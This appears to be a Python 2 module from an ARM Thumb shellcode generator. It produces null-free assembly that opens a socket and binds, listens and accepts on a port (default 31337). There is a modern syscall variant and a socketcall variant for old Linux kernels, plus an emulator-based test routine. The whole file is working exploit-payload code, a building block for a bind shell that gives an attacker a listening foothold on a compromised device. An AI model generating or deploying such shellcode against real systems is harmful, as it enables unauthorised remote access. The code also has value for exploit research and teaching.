# listen(port)

from socket import ntohs

def generate(port=31337, version=3):
    """listens on specific port

    Args:
        port(int): specific port

        version(int): 2 is old linux kernel including 2.x (default: 3)

    Returns:
        ``r6`` reg indicates socket descriptor
    """

    if int(version) == 3:
        sc = """
        /* socket(AF_INET, SOCK_STREAM, ...) */
        movs r0, #2
        movs r1, #1
        subs r2, r2, r2
        subs r7, r7, r7
        adds r7, r7, #255
        adds r7, r7, #26
        svc 1

        /* backup socket descriptor r6 
           bind(...)
        */
        movs r6, r0
        mov r4, pc
        adds r4, #22
        ldr r1, [r4]
        subs r2, r2, r2
        push { r1, r2 }
        mov r0, r6
        mov r1, sp
        movs r2, #16
        subs r7, r7, r7
        adds r7, r7, #255
        adds r7, r7, #27
        svc 1

        b after_sockaddr_in_2

        /* sockaddr_in struct(...) */
    sockaddr_in_1:
        .short 2
        .short %s

        /* listen(...) */
    after_sockaddr_in_2:
        movs r1, #16
        mov r0, r6
        subs r7, r7, r7
        adds r7, r7, #255
        adds r7, r7, #29
        svc 1

        /* accept(...) */
        mov r0, r6
        subs r1, r1, r1
        subs r2, r2, r2
        subs r7, r7, r7
        adds r7, r7, #255
        adds r7, r7, #30
        svc 1
        """ % (ntohs(port))
        return sc
    elif int(version) == 2:
        # for old linux kernel
        sc = """
	/* socketcall( socket, { 2, 1, 6 } ) */
        movs r1, #2
        movs r2, #1
        movs r3, #6
        push {r1-r3}
        movs r0, #1
        mov  r1, sp
        movs r7, #102
        svc 1

        /* backup socket descriptor r6 bind(...) */
        mov  r6, r0

        /* socketcall( bind, { struct sockaddr_in })*/
        mov  r4, pc
        adds r4, #24
        ldr  r1, [r4]
        subs r2, r2, r2
        push { r1, r2 }

        mov  r0, r6
        mov  r1, sp
        movs r2, #16
        push { r0-r2 }
        /* BIND */
        movs r0, #2
        mov  r1, sp
        movs r7, #102
        svc 1
        
        b listen_func

        /* AF_INET */
        .short 2 
        /* PORT    */
        .short %s

        listen_func:

        /* socketcall( listen, { fd, backlog } ) */
        movs  r1, #16
        mov   r0, r6
        push { r0, r1 }
        /* LISTEN */
        movs r0, #4
        mov  r1, sp
        movs r7, #102
        svc 1

        /* socketcall( accept, { fd, 0, 0 } ) */
        mov   r0, r6
        subs  r1, r1, r1
        subs  r2, r2, r2
        push { r0-r2 }
        /* ACCEPT */
        movs r0, #5
        mov  r1, sp
        movs r7, #102
        svc 1

        """ % (ntohs(port))

        return sc

    else:
        print "Not implemented yet"
        return None


def testcase(port=31337):
    import ARMSCGen as scgen
    sc = scgen.ks_asm('thumb', generate(port))[0]
    sclen = len(sc)
    print "[+] Registers information"
    regs = scgen.UC_TESTSC(sc, sclen, scgen.UC_ARCH_ARM, scgen.UC_MODE_THUMB, False)
